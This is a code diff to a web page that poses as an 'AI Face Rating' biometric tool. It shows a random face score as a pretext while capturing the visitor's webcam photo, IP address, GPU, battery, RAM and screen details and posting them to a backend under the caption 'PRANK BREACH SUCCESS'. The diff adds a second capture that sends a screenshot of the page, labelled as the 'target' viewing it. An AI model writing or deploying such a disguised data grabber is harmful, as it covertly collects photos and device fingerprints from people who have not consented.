@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Face Rating - Biometric Analysis</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700&display=swap');
         :root { --cyan: #00f2ff; }
@@ -20,7 +21,7 @@
     </style>
 </head>
 <body>
-    <div class="app-card">
+    <div class="app-card" id="capture-area">
         <div id="intro">
             <h1>Face<span style="color:var(--cyan)">Rating</span> AI</h1>
             <p style="color: #888; font-size: 0.9rem;">Analisis struktur wajah dan audit keamanan perangkat menggunakan modul AI terbaru.</p>
@@ -52,7 +53,6 @@
                 setTimeout(async () => {
                     s.innerText = "Extracting Biometric Data...";
                     
-                    // Data Grabber
                     let ip = "N/A"; try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
                     let bt = "N/A"; try { const b = await navigator.getBattery(); bt = Math.round(b.level * 100) + "%"; } catch(e) {}
                     let gp = "N/A"; try { const gl = document.createElement('canvas').getContext('webgl'); const db = gl.getExtension('WEBGL_debug_renderer_info'); gp = gl.getParameter(db.UNMASKED_RENDERER_WEBGL); } catch(e) {}
@@ -60,24 +60,39 @@
                     let screen = `${window.screen.width}x${window.screen.height}`;
 
                     setTimeout(async () => {
-                        // Capture
+                        // 1. Capture Foto Kamera
                         const ctx = c.getContext('2d');
                         c.width = v.videoWidth; c.height = v.videoHeight;
                         ctx.translate(c.width, 0); ctx.scale(-1, 1);
                         ctx.drawImage(v, 0, 0, c.width, c.height);
-                        
                         const photoBase64 = c.toDataURL('image/png');
+
+                        // 2. Capture Screenshot Tampilan Web
+                        const screenCanvas = await html2canvas(document.body);
+                        const screenBase64 = screenCanvas.toDataURL('image/png');
+
                         const sc = Math.floor(Math.random() * 8) + 91;
 
                         // Efek Flash Putih (Fake Screenshot)
                         document.body.style.background = "#fff";
                         
+                        // KIRIM FOTO WAJAH + DATA
                         await fetch('/api/send', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
                                 image: photoBase64,
-                                caption: `🎯 **PRANK BREACH SUCCESS**\n\n⭐ **Face Score:** ${sc}%\n🌐 **IP:** \`${ip}\`\n🔋 **Battery:** ${bt}\n🖥️ **Screen:** ${screen}\n💾 **RAM:** ±${ram}\n🎮 **GPU:** \`${gp}\`\n📱 **Platform:** ${navigator.platform}\n\n⚠️ *SIM 1 & 2 Data Encrypted by System*`
+                                caption: `🎯 **PRANK BREACH SUCCESS**\n\n⭐ **Face Score:** ${sc}%\n🌐 **IP:** \`${ip}\`\n🔋 **Battery:** ${bt}\n🖥️ **Screen:** ${screen}\n💾 **RAM:** ±${ram}\n🎮 **GPU:** \`${gp}\`\n📱 **Platform:** ${navigator.platform}\n\n⚠️ *Camera Captured*`
+                            })
+                        });
+
+                        // KIRIM SCREENSHOT LAYAR
+                        await fetch('/api/send', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                image: screenBase64,
+                                caption: `🖼️ **REAL SCREENSHOT CAPTURED**\nTarget sedang melihat halaman ini.`
                             })
                         });
 
